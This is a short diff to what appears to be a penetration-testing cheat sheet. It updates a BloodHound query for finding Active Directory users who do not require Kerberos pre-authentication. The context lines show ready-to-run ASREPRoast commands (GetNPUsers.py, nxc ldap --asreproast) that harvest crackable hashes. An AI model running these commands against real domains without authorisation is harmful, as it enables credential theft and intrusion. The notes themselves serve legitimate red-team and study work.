@@ -21,7 +21,7 @@
 
 ## ASREPRoast
 - List ASREPRoastable Users (need creds)
-  - `MATCH (u:User {dontreqpreauth:true}),(c:Computer), p=shortestPath((u)-[*1..]->(c)) RETURN p`
+  - `MATCH (u:User) WHERE u.dontreqpreauth = true AND u.enabled = true RETURN u`
 - ASREP roasting >>> Hash found ASREP
   - `GetNPUsers.py <domain>/ -usersfile <users.txt> -format hashcat -outputfile <output.txt>`
   - `nxc ldap <dc_ip> -u <users.txt>  -p '' --asreproast <output.txt>`
